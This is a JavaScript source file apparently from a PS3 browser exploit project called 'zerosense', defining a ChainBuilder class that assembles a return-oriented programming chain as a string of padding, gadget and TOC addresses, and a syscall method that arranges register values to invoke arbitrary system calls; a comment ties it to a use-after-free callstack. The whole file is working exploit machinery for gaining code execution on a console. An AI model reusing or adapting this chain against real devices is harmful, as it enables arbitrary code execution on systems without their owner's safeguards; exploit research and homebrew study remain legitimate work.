var Util = require('zerosense/Util');

class ChainBuilder {
	
	constructor() {
		this.data = "";
	}
	
	static setup2(addr) {
		var charCommas = unescape("\u8282");
		
		return unescape("\u0102\u7efb")
			+ Util.padding(0x30, charCommas)
			+ Util.int2bin(addr)
			+ unescape("\ufb7e");
	}
	
	static setup1(addr) {		
		return unescape("\u4141\u7efa")
			+ Util.int2bin(addr)
			+ unescape("\ufa7e");
	}
	
	create() {
		var charAA = unescape("\u4141");
		
		var start = unescape("\u4141\u2a2f")
			+ Util.int2bin(Offsets.addrGadget1)
			+ Util.int2bin(Offsets.addrToc)
			+ Util.padding(0x20, charAA)
			+ Util.int2bin64(0x0, Offsets.addrToc)
			+ Util.padding(0x70, charAA);
			
		var end = Util.int2bin64(0x0, Offsets.addrGadgetMod8)
			+ unescape("\u2f2a");
			
		return start + this.data + end;
	}
	
	syscall(sc, r3, r4, r5, r6, r7, r8, r9, r10, _r31out) {
		var charAA = unescape("\u4141");
		var addrGtemp = 0x8D000500;
		var spExit = 0x8FD8DCC0;
		/**
		 * spExit is the address of 0x39C1868 in 0x8fd8 -ish, which is the callstack of the uaf minus 2
		 * This isn't the same as ps3xploit = 0x8FD8DCC0 (since we use more memory?)
		 * 0x8f390000 + 0x9fd200 - 0x10   (remember this is a ptr to a double!)
		 */
		
		var r31out = typeof _r31out !== 'undefined' ?  _r31out : addrGtemp;
		
		this.data += Util.int2bin64(0x0, Offsets.addrGadgetMod2)
			+ Util.padding(0x60, charAA)
			+ Util.int2bin64(0x0, addrGtemp)
			+ Util.padding(0x10, charAA)
			+ Util.int2bin64(0x0, Offsets.addrGadgetMod1)
			+ Util.padding(0x50, charAA)
			+ Util.padding(0xC, charAA)
			+ Util.int2bin(sc)
			+ Util.int2bin(r10)
			+ Util.int2bin(r8)
			+ Util.int2bin(r7)
			+ Util.int2bin(r6)
			+ Util.int2bin(r5)
			+ Util.int2bin(r4)
			+ Util.padding(0x4, charAA)
			+ Util.int2bin(r9)
			+ Util.padding(0x20, charAA)
			+ Util.int2bin64(0x0, r3)
			+ Util.padding(0x10, charAA)
			+ Util.int2bin64(0x0, Offsets.addrGadgetMod2)
			+ Util.padding(0x60, charAA)
			+ Util.int2bin64(0x0, addrGtemp)
			+ Util.padding(0x10, charAA)
			+ Util.int2bin64(0x0, Offsets.addrGadgetMod4a)
			+ Util.padding(0x60, charAA)
			+ Util.int2bin64(0x0, r31out)
			+ Util.int2bin64(0x0, spExit)
			+ Util.padding(0x8, charAA);
			
		return this;
	}
	
}

module.exports = ChainBuilder;